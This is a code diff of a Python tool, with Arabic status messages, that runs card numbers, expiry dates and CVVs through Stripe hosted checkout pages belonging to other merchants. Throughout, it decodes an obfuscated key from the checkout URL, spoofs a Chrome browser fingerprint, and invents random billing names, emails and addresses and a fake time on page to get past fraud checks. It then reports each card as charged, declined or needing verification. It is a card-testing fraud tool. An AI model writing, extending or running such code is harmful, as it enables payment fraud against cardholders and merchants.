@@ -3,6 +3,9 @@ import os
 import re
 import json
 import time
+import base64
+import urllib.parse
+import random
 import asyncio
 from typing import Dict, Optional
 
@@ -42,55 +45,148 @@ class StripeSession:
         self.url = target_url.strip()
         self.pk = ""
         self.cs = ""
+        self.acct = ""
         self.amount = 100
         self.currency = "USD"
         self.merchant_name = "Stripe Merchant"
         self.session = None
+        self.tracking = {
+            "muid": os.urandom(16).hex(),
+            "sid": os.urandom(16).hex(),
+            "guid": os.urandom(16).hex()
+        }
+        self.init_checksum = ""
+
+    def _decode_fid(self, fragment: str) -> Optional[dict]:
+        try:
+            raw = urllib.parse.unquote(fragment.strip()).rstrip('%')
+            pad = raw + "=" * (-len(raw) % 4)
+            if '-' in pad or '_' in pad:
+                pad = pad.translate(str.maketrans('-_', '+/'))
+            decoded = base64.b64decode(pad, validate=True)
+            xored = bytes(b ^ 5 for b in decoded).decode("utf-8", errors="ignore")
+            data = json.loads(xored.strip())
+            return data if isinstance(data, dict) else None
+        except:
+            return None
 
     async def prefetch(self) -> tuple[bool, str]:
         try:
-            if "#" in self.url:
-                frag = self.url.split("#")[1]
-                import base64, urllib.parse
-                unquoted = urllib.parse.unquote(frag)
-                pad = unquoted + "=" * (-len(unquoted) % 4)
-                decoded = base64.b64decode(pad, altchars=b"-_")
-                xored = bytes(b ^ 5 for b in decoded).decode("utf-8", errors="ignore")
-                j = json.loads(xored)
-                self.pk = j.get("apiKey", "")
-                self.cs = j.get("checkoutSessionId", "")
-            
-            if not self.pk or not self.cs:
-                m_cs = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+)', self.url)
+            no_frag = self.url.split('#')[0]
+            m_cs = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]{20,})', no_frag)
+            if m_cs:
+                self.cs = m_cs.group(1)
+
+            if '#' in self.url:
+                frag = self.url.split('#', 1)[1].split('?')[0]
+                fid = self._decode_fid(frag)
+                if fid:
+                    for k in ['apiKey', 'publishableKey', 'pk']:
+                        if fid.get(k, '').startswith('pk_'):
+                            self.pk = fid[k]
+                            break
+                    for k in ['stripeAccount', 'stripe_account', 'account']:
+                        if fid.get(k, '').startswith('acct_'):
+                            self.acct = fid[k]
+                            break
+
+            if not self.pk:
                 m_pk = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]+)', self.url)
-                if m_cs: self.cs = m_cs.group(1)
-                if m_pk: self.pk = m_pk.group(1)
+                if m_pk:
+                    self.pk = m_pk.group(1)
 
             if not self.pk or not self.cs:
                 return False, "لم يتم العثور على مفاتيح PK أو CS في الرابط."
 
             import curl_cffi.requests as cffi
             self.session = cffi.AsyncSession(impersonate="chrome131", verify=False)
-            
-            r = await self.session.get(
-                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
-                params={"key": self.pk},
-                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
+            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+
+            # Step 1: Warmup GET
+            await self.session.get(
+                f"https://checkout.stripe.com/c/pay/{self.cs}",
+                headers={'accept': 'text/html', 'user-agent': ua},
                 timeout=12
             )
-            if r.status_code != 200:
-                return False, f"فشل الاتصال بـ Stripe API (HTTP {r.status_code})"
-                
-            data = r.json() or {}
-            pi = data.get("payment_intent") or {}
-            due = (data.get("total_summary") or {}).get("due") or (data.get("invoice") or {}).get("amount_due")
-            self.amount = int(due or pi.get("amount") or 100)
-            self.currency = str(data.get("currency") or pi.get("currency") or "USD").upper()
+
+            # Step 2: Fingerprint simulation via m.stripe.com/6
+            fp_payload = {
+                'v': 2, 'tag': '5.6.8_js_fp', 'src': 'checkout-inner-live-v3',
+                'a': {'a': self.pk, 'b': f"https://checkout.stripe.com/c/pay/{self.cs}", 'c': 24, 'd': '1920x1080', 'e': False, 'f': 'en-US', 'g': 'Win32', 'h': ua, 'i': -300, 'j': False, 'k': 8, 'l': 8}
+            }
+            fp_r = await self.session.post(
+                'https://m.stripe.com/6',
+                json=fp_payload,
+                headers={'content-type': 'application/json', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua},
+                timeout=8
+            )
+            if fp_r.status_code == 200:
+                fpj = fp_r.json() or {}
+                if isinstance(fpj, dict):
+                    if fpj.get('muid'): self.tracking['muid'] = fpj['muid']
+                    if fpj.get('sid'): self.tracking['sid'] = fpj['sid']
+                    if fpj.get('guid'): self.tracking['guid'] = fpj['guid']
+
+            # Step 3: Init Session
+            init_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://checkout.stripe.com',
+                'referer': f'https://checkout.stripe.com/c/pay/{self.cs}',
+                'user-agent': ua,
+                'stripe-version': '2020-08-27'
+            }
+            if self.acct:
+                init_headers['stripe-account'] = self.acct
+
+            init_data = {
+                'key': self.pk, 'eid': 'NA', 'browser_locale': 'en-US',
+                'browser_timezone': 'America/New_York', 'redirect_type': 'url'
+            }
+
+            r_init = await self.session.post(
+                f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
+                data=init_data,
+                headers=init_headers,
+                timeout=15
+            )
+            d = r_init.json() or {}
+            if d.get('error'):
+                return False, d['error'].get('message', 'Init error')
+
+            self.init_checksum = d.get('init_checksum', '')
+            acct_set = d.get('account_settings') or {}
+            if acct_set.get('display_name'):
+                self.merchant_name = acct_set['display_name']
+
+            # حل المبالغ بدقة من الـ Init
+            lig = d.get('line_item_group') or {}
+            inv = d.get('invoice') or {}
+            pi = d.get('payment_intent') or {}
             
-            acct = data.get("account_settings") or {}
-            if acct.get("display_name"):
-                self.merchant_name = acct["display_name"]
-                
+            total = None
+            if lig.get('localized_prices_metas'):
+                for m in lig['localized_prices_metas']:
+                    if isinstance(m, dict) and m.get('currency') == 'usd' and m.get('total', 0) > 0:
+                        total = int(m['total'])
+                        break
+            if total is None:
+                for f in ['total', 'due', 'subtotal']:
+                    if lig.get(f) and int(lig[f]) > 0:
+                        total = int(lig[f])
+                        self.currency = str(lig.get('currency', 'USD')).upper()
+                        break
+            if total is None:
+                for f in ['amount_due', 'total']:
+                    if inv.get(f) and int(inv[f]) > 0:
+                        total = int(inv[f])
+                        self.currency = str(inv.get('currency', 'USD')).upper()
+                        break
+            if total is None and pi.get('amount'):
+                total = int(pi['amount'])
+                self.currency = str(pi.get('currency', 'USD')).upper()
+
+            self.amount = total if total else 100
             return True, ""
         except Exception as e:
             return False, str(e)
@@ -101,93 +197,105 @@ class StripeSession:
         mm = card_dict["mm"]
         yy = card_dict["yy"]
         cvv = card_dict["cvv"]
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 
         try:
-            r_page = await self.session.get(
-                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
-                params={"key": self.pk},
-                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
-                timeout=12
-            )
-            page_data = r_page.json() or {}
-            pi_obj = page_data.get("payment_intent") or {}
-            pi_id = pi_obj.get("id")
-            pi_client_secret = pi_obj.get("client_secret")
+            # عشوائية بيانات الفواتير مثل سكربت الـ PHP
+            first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
+            last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
+            streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd']
+            cities = [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Houston', 'TX', '77001')]
+            city_info = random.choice(cities)
+            
+            billing_name = f"{random.choice(first_names)} {random.choice(last_names)}"
+            billing_email = f"usr{random.randint(10000, 99999)}@gmail.com"
+            line1 = f"{random.randint(100, 9999)} {random.choice(streets)}"
 
             tok_body = {
-                "type": "card",
-                "card[number]": cc,
-                "card[cvc]": cvv,
-                "card[exp_month]": mm,
-                "card[exp_year]": yy,
-                "billing_details[address][country]": "US",
-                "billing_details[address][postal_code]": "10001",
-                "key": self.pk,
-                "payment_user_agent": "stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; checkout"
+                'type': 'card',
+                'card[number]': cc, 'card[cvc]': cvv, 'card[exp_month]': mm, 'card[exp_year]': yy,
+                'billing_details[name]': billing_name, 'billing_details[email]': billing_email,
+                'billing_details[address][country]': 'US', 'billing_details[address][line1]': line1,
+                'billing_details[address][city]': city_info[0], 'billing_details[address][postal_code]': city_info[2],
+                'billing_details[address][state]': city_info[1],
+                'payment_user_agent': 'stripe.js/acacia; stripe-js-v3/acacia; checkout-inner-app',
+                'time_on_page': str(random.randint(3000, 8000)),
+                'muid': self.tracking['muid'], 'sid': self.tracking['sid'], 'guid': self.tracking['guid'],
+                'key': self.pk
             }
             
+            tok_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://checkout.stripe.com',
+                'referer': f'https://checkout.stripe.com/c/pay/{self.cs}',
+                'user-agent': ua,
+                'stripe-version': '2020-08-27'
+            }
+            if self.acct:
+                tok_headers['stripe-account'] = self.acct
+
             r_tok = await self.session.post(
-                "https://api.stripe.com/v1/payment_methods",
+                'https://api.stripe.com/v1/payment_methods',
                 data=tok_body,
-                headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
+                headers=tok_headers,
                 timeout=12
             )
             td = r_tok.json() or {}
-            pm_id = td.get("id")
-            
+            if td.get('error'):
+                err_obj = td['error']
+                return {
+                    "status": "DECLINED",
+                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
+                    "amount": f"{self.currency} {self.amount/100:.2f}",
+                    "response_time": time.time() - t0,
+                    "message": err_obj.get('message', 'Card Declined')
+                }
+
+            pm_id = td.get('id')
             if not pm_id:
-                err = td.get("error", {})
-                return {
-                    "status": "DECLINED",
-                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
-                    "amount": f"{self.currency} {self.amount/100:.2f}",
-                    "response_time": time.time() - t0,
-                    "message": err.get("message", "Card Declined")
-                }
+                return {"status": "DECLINED", "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}", "amount": f"{self.currency} {self.amount/100:.2f}", "response_time": time.time() - t0, "message": "Failed to create Payment Method"}
 
-            if pi_id and pi_client_secret:
-                conf_pi_body = {
-                    "payment_method": pm_id,
-                    "expected_payment_method_type": "card",
-                    "use_stripe_sdk": "true",
-                    "key": self.pk,
-                    "client_secret": pi_client_secret
-                }
-                r_conf = await self.session.post(
-                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
-                    data=conf_pi_body,
-                    headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
-                    timeout=20
-                )
-            else:
-                confirm_body = {
-                    "key": self.pk,
-                    "payment_method": pm_id,
-                    "expected_payment_method_type": "card",
-                    "expected_amount": str(self.amount),
-                    "return_url": self.url.split("#")[0],
-                    "client_attribution_metadata[client_session_id]": self.cs,
-                }
-                r_conf = await self.session.post(
-                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
-                    data=confirm_body,
-                    headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
-                    timeout=20
-                )
+            # بناء وتأكيد الدفع Confirm
+            confirm_body = {
+                'eid': 'NA',
+                'payment_method': pm_id,
+                'expected_payment_method_type': 'card',
+                'return_url': "https://checkout.stripe.com/return",
+                'key': self.pk,
+                'client_attribution_metadata[client_session_id]': self.cs,
+                'client_attribution_metadata[merchant_integration_source]': 'checkout',
+                'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
+                'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
+                'expected_amount': str(self.amount),
+                'muid': self.tracking['muid'],
+                'sid': self.tracking['sid'],
+                'guid': self.tracking['guid']
+            }
+            if self.init_checksum:
+                confirm_body['init_checksum'] = self.init_checksum
 
+            r_conf = await self.session.post(
+                f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
+                data=confirm_body,
+                headers=tok_headers,
+                timeout=20
+            )
             resp = r_conf.json() or {}
-            err = resp.get("error") or {}
-            if err:
+            
+            if resp.get('error'):
+                err_obj = resp['error']
+                err_msg = err_obj.get('message', 'Declined')
                 return {
                     "status": "DECLINED",
                     "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                     "amount": f"{self.currency} {self.amount/100:.2f}",
                     "response_time": time.time() - t0,
-                    "message": err.get("message", "Declined")
+                    "message": err_msg
                 }
 
-            pi = resp.get("payment_intent") or resp.get("setup_intent") or resp or {}
-            pi_status = str(pi.get("status") or "")
+            pi = resp.get('payment_intent') or resp.get('setup_intent') or resp or {}
+            pi_status = str(pi.get('status') or '')
 
             if pi_status in ("succeeded", "complete", "requires_capture"):
                 return {
@@ -197,7 +305,7 @@ class StripeSession:
                     "response_time": time.time() - t0,
                     "message": "تم خصم المبلغ بنجاح ✅"
                 }
-            elif pi_status == "requires_action" or pi.get("next_action"):
+            elif pi_status in ("requires_action", "requires_source_action") or pi.get("next_action"):
                 return {
                     "status": "REQUIRES_ACTION",
                     "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
@@ -211,7 +319,7 @@ class StripeSession:
                     "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                     "amount": f"{self.currency} {self.amount/100:.2f}",
                     "response_time": time.time() - t0,
-                    "message": f"الرد: {pi_status or 'Declined'}"
+                    "message": f"الحالة: {pi_status or 'Declined'}"
                 }
 
         except Exception as e:
